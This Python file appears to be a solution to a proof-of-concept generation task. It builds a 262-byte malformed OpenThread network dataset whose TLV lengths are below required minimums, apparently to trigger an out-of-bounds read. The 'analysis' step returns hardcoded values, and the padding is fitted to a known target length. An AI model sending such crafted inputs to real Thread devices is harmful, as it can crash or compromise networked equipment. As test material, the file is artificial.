import os
import tarfile
import tempfile
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract source to analyze vulnerability
        with tarfile.open(src_path, 'r:gz') as tar:
            extract_dir = tempfile.mkdtemp()
            tar.extractall(extract_dir)
            
        # Look for dataset-related files to understand TLV structure
        tlv_structure = self._analyze_tlv_structure(extract_dir)
        
        # Clean up
        import shutil
        shutil.rmtree(extract_dir)
        
        # Construct malicious dataset with invalid TLV lengths
        # Based on typical Thread Network Dataset TLV format
        poc = self._construct_poc(tlv_structure)
        return poc
    
    def _analyze_tlv_structure(self, extract_dir: str) -> dict:
        """Analyze source to understand TLV structure"""
        # For this specific vulnerability, we need to understand:
        # - TLV header format (Type + Length)
        # - Minimum required lengths for specific TLV types
        # Typical format: | Type (1B) | Length (1B) | Value (variable) |
        
        # Based on OpenThread Dataset TLVs:
        # Active Timestamp (type 0x01): Should be 8+ bytes
        # Pending Timestamp (type 0x51): Should be 8+ bytes  
        # Delay Timer (type 0x52): Should be 4+ bytes
        
        return {
            'header_size': 2,  # Type + Length bytes
            'tlvs': {
                0x01: {'name': 'ActiveTimestamp', 'min_len': 8},
                0x51: {'name': 'PendingTimestamp', 'min_len': 8},
                0x52: {'name': 'DelayTimer', 'min_len': 4}
            }
        }
    
    def _construct_poc(self, tlv_info: dict) -> bytes:
        """Construct PoC dataset with invalid TLVs"""
        poc = bytearray()
        
        # Dataset header (simplified - just enough to get to vulnerable code)
        # Magic number/version to identify as dataset
        poc.extend(b'\x00\x01')  # Simple header
        
        # Add valid TLV first to pass initial checks
        # Network Master Key (type 0x00, length 16)
        poc.extend(struct.pack('BB', 0x00, 16))
        poc.extend(b'\x00' * 16)
        
        # Add invalid Active Timestamp TLV (type 0x01)
        # Set length to 1 (less than minimum 8) - this triggers the vulnerability
        # The code will try to read 8+ bytes but only 1 is available
        invalid_length = 1  # Less than required minimum of 8
        poc.extend(struct.pack('BB', 0x01, invalid_length))
        poc.extend(b'\x00' * invalid_length)  # Only provide 1 byte
        
        # Add more TLVs to reach approximate ground-truth length
        # Padding to get closer to 262 bytes
        padding_needed = 262 - len(poc)
        if padding_needed > 0:
            # Add more invalid TLVs to ensure overflow
            # Invalid Pending Timestamp (type 0x51, length 2)
            poc.extend(struct.pack('BB', 0x51, 2))
            poc.extend(b'\x00' * 2)
            
            # Invalid Delay Timer (type 0x52, length 1)
            poc.extend(struct.pack('BB', 0x52, 1))
            poc.extend(b'\x00' * 1)
            
            # Additional padding if still needed
            remaining = 262 - len(poc)
            if remaining > 0:
                poc.extend(b'\x00' * remaining)
        
        # Ensure exact length of 262 bytes
        if len(poc) > 262:
            poc = poc[:262]
        elif len(poc) < 262:
            poc.extend(b'\x00' * (262 - len(poc)))
        
        return bytes(poc)